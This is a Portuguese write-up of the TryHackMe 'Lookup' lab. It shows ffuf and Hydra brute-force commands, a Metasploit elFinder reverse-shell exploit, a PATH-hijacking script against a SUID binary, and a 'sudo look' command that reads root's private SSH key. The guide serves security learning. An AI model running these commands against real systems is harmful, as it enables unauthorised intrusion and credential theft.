---
title: "Lookup"
date: 2026-05-24
summary: "Força bruta com ffuf, exploração do elFinder, PATH hijacking e escalada de privilégios."
platform: "TryHackMe"
difficulty: "Fácil"
os: "Linux"
tags: ["ffuf", "elFinder", "SUID", "PATH Hijacking"]
draft: false
---

## Visão Geral

A máquina Lookup apresenta uma cadeia de exploração bem interessante. O caminho envolve a descoberta e manipulação de requisições web com o **ffuf**, ataques de força bruta, exploração de falhas conhecidas em um gerenciador de arquivos e movimentação lateral abusando de um binário SUID. Para fechar, a escalada final de privilégios mostra os riscos de deixar as configurações do `sudo` abertas demais.

## Reconhecimento

O processo começou com uma varredura padrão de portas e serviços usando o **Nmap**. O scan revelou dois serviços rodando na máquina alvo: SSH na porta 22 e um servidor web HTTP na porta 80.

*Comando de varredura Nmap*
```bash
nmap -sC -sV <TARGET_IP>
```

![Resultado do escaneamento do Nmap indicando portas 22 e 80.](/images/writeups/lookup/nmap.png)

Ao tentar acessar a porta 80, o servidor bloqueou o acesso direto pelo IP, o que indicou a necessidade de usar um DNS específico. Então, adicionei o IP do alvo atrelado ao domínio descoberto no arquivo local `/etc/hosts`. Ao atualizar a página, dei de cara com uma tela de login.

Fiz alguns testes manuais básicos usando `admin:admin`. O login falhou, mas a aplicação retornou o erro "wrong password" (senha incorreta), o que foi ótimo, pois confirmou que o usuário `admin` realmente existia.

## Exploração Inicial

Para passar pelo login, decidi usar o **ffuf** e rodar um ataque de força bruta (*brute force*). Sabendo que o usuário `admin` era válido, foquei primeiro em descobrir a senha enviando requisições HTTP POST para a página `/login.php`.

*Buscando a senha do admin via ffuf*
```bash
ffuf -w /usr/share/wordlists/rockyou.txt -X POST -u http://lookup.thm/login.php -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fw 8
```

O ataque deu certo e encontrou a senha `password123`. O problema é que a aplicação avisou que o usuário estava errado para aquela senha. Então, inverti a lógica: fixei a senha como `password123` e passei a *wordlist* no campo de usuário. Com isso, o ffuf revelou que o usuário correto era `jose`.

*Buscando o user via ffuf*
```bash
ffuf -w /usr/share/wordlists/rockyou.txt -X POST -u http://lookup.thm/login.php -d "username=FUZZ&password=password123" -H "Content-Type: application/x-www-form-urlencoded" -fw 10
```

Fazendo o login com as credenciais `jose:password123`, tive acesso a um gerenciador de arquivos chamado **elFinder**, rodando na versão 2.1.47.

## Obtenção de Shell e Movimentação Lateral

Sabendo a versão exata do gerenciador, fui procurar por *exploits* públicos usando o **Searchsploit**. Encontrei um código em PHP que podia ser executado facilmente pelo Metasploit (`msfconsole`).

*Configuração e execução do exploit no Metasploit*
```bash
msfconsole
search elfinder
use 4
set RHOSTS <IP_ALVO>
set LHOST <IP_LOCAL>
exploit
```

A exploração funcionou direto e me deu um *reverse shell* como o usuário `www-data`. Depois de estabilizar o shell interativo com Python, dei uma olhada no `/etc/passwd` e achei um usuário local chamado `think`. A primeira flag (`user.txt`) estava na pasta dele, mas eu ainda não tinha permissão de leitura.

Partindo para a enumeração interna do sistema, encontrei o binário `/usr/sbin/dwm` com a flag SUID do `root` ativada. Ao rodar o programa para testar, percebi que ele chamava o comando nativo `id` do sistema para registrar o usuário. A grande falha aqui é que ele chamava o `id` de forma relativa, sem usar o caminho absoluto (`/usr/bin/id`).

Aproveitando essa brecha, fiz um *PATH Hijacking*. Criei um script malicioso chamado `id` dentro da pasta `/tmp` e ajustei a variável `PATH` para que o sistema buscasse os executáveis nessa pasta primeiro.

*Manipulação de PATH (PATH Hijacking)*
```bash
export PATH=/tmp:$PATH
echo "/bin/bash" > /tmp/id
chmod +x /tmp/id
/usr/sbin/dwm
```

Essa execução me devolveu uma lista de possíveis senhas. Salvei essa lista na minha máquina como `senhas.txt` e usei o **Hydra** para fazer um *brute force* no SSH contra o usuário `think`.

*Quebra de senha via SSH*
```bash
hydra -l think -P senhas.txt ssh://<TARGET_IP>
```

Consegui achar a senha correta, loguei via SSH e finalmente li a flag de usuário.

## Escalada de Privilégios

Já logado como `think`, rodei o `sudo -l` para ver o que eu podia executar como administrador. Descobri que o usuário podia rodar o utilitário `look` como root sem precisar de senha.

Dando uma olhada nas dicas do repositório **GTFOBins**, vi que o `look` pode ser usado para ler praticamente qualquer arquivo do sistema, ignorando as permissões normais de segurança. Usei isso a meu favor para extrair diretamente a chave privada RSA (`id_rsa`) do próprio `root`.

*Leitura da chave privada RSA usando o look*
```bash
sudo look '' /root/.ssh/id_rsa
```

Copiei a chave RSA para o meu computador, ajustei as permissões de segurança para o padrão exigido (`chmod 600 chave.key`) e fiz o login no SSH direto com a conta de administrador (`ssh -i chave.key root@<IP>`). Já com o terminal `root` aberto, peguei a flag final, concluindo a máquina.

## Conclusão

A máquina Lookup é um ótimo exemplo prático dos perigos de expor aplicações web desatualizadas. Tudo começou porque a tela de login não possuía nenhum mecanismo de proteção contra *brute force*.

A partir do acesso inicial, o comprometimento do servidor aprofundou-se por conta de falhas clássicas de infraestrutura e *hardening* de Linux: primeiro, um binário SUID vulnerável a manipulação de variável de ambiente (*PATH Hijacking*); depois, uma regra de `sudo` mal configurada que permitiu ler arquivos confidenciais livremente. Essa combinação em cadeia resultou na exfiltração da chave privada do superusuário e na queda total do sistema.

## Referências

- GTFOBins. *look*. Disponível em: <https://gtfobins.github.io/gtfobins/look/>
- OffSec. *Exploit Database*. Disponível em: <https://www.exploit-db.com/>
